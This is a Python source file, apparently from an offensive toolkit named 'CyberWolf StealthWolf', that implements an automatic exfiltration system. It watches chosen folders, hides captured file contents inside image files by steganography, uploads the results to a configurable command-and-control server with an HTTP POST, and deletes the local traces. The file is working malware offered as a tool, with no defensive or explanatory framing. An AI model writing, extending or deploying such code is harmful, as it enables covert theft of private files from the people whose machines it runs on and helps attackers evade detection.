"""
CyberWolf StealthWolf - Auto Exfiltration System
Watches folders and automatically smuggles files
"""

import os
import time
import hashlib
import json
import requests
from datetime import datetime
import threading
import queue

try:
    from watchdog.observers import Observer
    from watchdog.events import FileSystemEventHandler
    WATCHDOG_AVAILABLE = True
except ImportError:
    WATCHDOG_AVAILABLE = False
    print("Install watchdog: pip install watchdog")

class AutoExfiltrator:
    def __init__(self, smuggler, watch_dirs: list, c2_url: str = None):
        self.smuggler = smuggler
        self.watch_dirs = watch_dirs
        self.c2_url = c2_url
        self.queue = queue.Queue()
        self.running = True
        self.processed_files = set()
    
    def process_file(self, file_path: str):
        """Process a file for exfiltration"""
        if file_path in self.processed_files:
            return
        
        # Check if it's a carrier image
        if not file_path.lower().endswith(('.png', '.jpg', '.jpeg')):
            return
        
        # Wait for file to be completely written
        time.sleep(0.5)
        
        try:
            # Read file content
            with open(file_path, 'rb') as f:
                data = f.read()
            
            # Create output path
            output_path = f"/tmp/exfil_{hashlib.md5(file_path.encode()).hexdigest()}.png"
            
            # Smuggle data into image
            result = self.smuggler.smuggle_into_image(
                file_path, 
                data, 
                output_path
            )
            
            if result['success']:
                print(f"[+] Smuggled: {file_path} -> {output_path}")
                
                # Send to C2 if configured
                if self.c2_url:
                    self.send_to_c2(output_path, file_path)
                
                self.processed_files.add(file_path)
                os.remove(output_path)  # Cleanup
                
        except Exception as e:
            print(f"[-] Error processing {file_path}: {e}")
    
    def send_to_c2(self, file_path: str, original_path: str):
        """Send smuggled file to C2 server"""
        try:
            with open(file_path, 'rb') as f:
                files = {'file': f}
                data = {'original': original_path}
                response = requests.post(self.c2_url, files=files, data=data, timeout=30)
                if response.status_code == 200:
                    print(f"[+] Sent to C2: {original_path}")
        except Exception as e:
            print(f"[-] C2 send failed: {e}")
    
    def start(self):
        """Start watching directories"""
        if not WATCHDOG_AVAILABLE:
            print("Watchdog not available - using polling mode")
            self.polling_mode()
            return
        
        class ExfilHandler(FileSystemEventHandler):
            def __init__(self, exfil):
                self.exfil = exfil
            
            def on_created(self, event):
                if not event.is_directory:
                    self.exfil.queue.put(event.src_path)
            
            def on_modified(self, event):
                if not event.is_directory:
                    self.exfil.queue.put(event.src_path)
        
        handler = ExfilHandler(self)
        observer = Observer()
        
        for watch_dir in self.watch_dirs:
            os.makedirs(watch_dir, exist_ok=True)
            observer.schedule(handler, watch_dir, recursive=True)
            print(f"[+] Watching: {watch_dir}")
        
        observer.start()
        
        # Process queue
        while self.running:
            try:
                file_path = self.queue.get(timeout=1)
                self.process_file(file_path)
            except queue.Empty:
                continue
    
    def polling_mode(self):
        """Fallback polling mode"""
        while self.running:
            for watch_dir in self.watch_dirs:
                for root, dirs, files in os.walk(watch_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        self.process_file(file_path)
            time.sleep(5)

if __name__ == "__main__":
    print("Auto Exfiltration ready")
